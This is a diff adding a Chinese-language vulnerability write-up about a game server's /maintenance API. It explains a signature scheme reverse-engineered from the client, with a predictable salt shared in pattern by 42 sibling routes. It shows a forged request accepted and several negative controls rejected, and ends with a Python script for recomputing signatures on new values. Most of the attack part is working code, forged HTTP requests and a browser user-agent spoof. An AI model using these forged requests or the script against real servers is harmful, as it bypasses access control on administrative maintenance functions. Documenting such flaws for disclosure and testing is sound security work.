@@ -1,0 +1,96 @@
+## 目标与前置
+
+- 入口：https://<HOST>:47000/maintenance （POST，JSON）
+- UA 必须伪装浏览器（该主机对 curl 默认 UA 一律 403 返回 TEST-ERROR）
+- Content-Type: application/json;charset=utf-8
+- 自签证书需 -k / 忽略校验
+
+## 签名算法（逆向自客户端）
+
+```
+fields  = token, version, gametype, type, devicetype, deviceid, channel
+signstr = concat( for k in sorted(fields.keys()): k + value[k] ) + "private_maintenance"
+verify  = MD5(signstr).upper()          # 32 位大写
+```
+
+注意：**裸 key 拼裸 value**，既没有 `=` 也没有 `&`，字段之间也无分隔符。
+本路由的盐就是路由名派生出的 `private_maintenance`；同族 42 条 private_* 路由的盐均等于各自字段名，
+因此整体签名机制可被完全离线复现，不构成访问控制。
+
+本次样本：
+```
+signstr = channel105001deviceid0000000000000000devicetypeandroidgametype1token123type1version1.0.0.9private_maintenance
+verify  = 0C19F50440BD4B045E3DF6BC9DD45AFF
+```
+
+## 正向请求（命中）
+
+```http
+POST /maintenance HTTP/1.1
+Host: <HOST>:47000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+Content-Type: application/json;charset=utf-8
+
+{"token":"123","version":"1.0.0.9","gametype":"1","type":"1","devicetype":"android","deviceid":"0000000000000000","channel":"105001","verify":"0C19F50440BD4B045E3DF6BC9DD45AFF"}
+```
+
+响应：
+```
+HTTP/1.1 200 OK
+Content-Type: application/json;charset=utf-8
+Content-Length: 9
+
+{"ret":0}
+```
+
+## 阴性对照（必须做，用于排除"无条件返回"）
+
+同一算法、仅把 channel 置空串：
+```http
+POST /maintenance HTTP/1.1
+Host: <HOST>:47000
+Content-Type: application/json;charset=utf-8
+
+{"token":"123","version":"1.0.0.9","gametype":"1","type":"1","devicetype":"android","deviceid":"0000000000000000","channel":"","verify":"FB7AE40BA0708E961EBD2D6F921CFE57"}
+```
+响应：
+```
+HTTP/1.1 200 OK
+Content-Length: 39
+
+{"ret":1,"msg":"参数检查失败！"}
+```
+
+另外 6 种形态全部返回同一拒绝（200/39B）：
+- `k=v&` 形式拼接
+- 盐以 `&key=salt` 形式追加
+- 按原始字段顺序（不排序）
+- verify 小写
+- channel 空串（见上）
+- 其余字段值改动但未重算 verify
+
+结论：`{"ret":0}` 是签名通过后的业务层返回，不是无条件 200 内容。
+
+## 判定口径与边界
+
+- 成立：伪造 verify 被接受（ret:0）且阴性对照被拒（ret:1 参数检查失败）
+- 本次响应中**未出现 data.servers[]**，数据面（能否真正下发/改写维护配置）未确认；
+  需先用正确字段常量再复核，勿把 ret:0 直接等同于"可控制维护下发"。
+
+## 复算脚本（python，供换值复用）
+
+```python
+import hashlib, json
+
+def make_verify(payload: dict, salt="private_maintenance") -> str:
+    items = {k: v for k, v in payload.items() if k != "verify"}
+    signstr = "".join(f"{k}{items[k]}" for k in sorted(items))
+    signstr += salt
+    print("signstr =", signstr)
+    return hashlib.md5(signstr.encode()).hexdigest().upper()
+
+body = {"token":"123","version":"1.0.0.9","gametype":"1","type":"1",
+        "devicetype":"android","deviceid":"0000000000000000","channel":"105001"}
+body["verify"] = make_verify(body)
+print(json.dumps(body, ensure_ascii=False))
+```
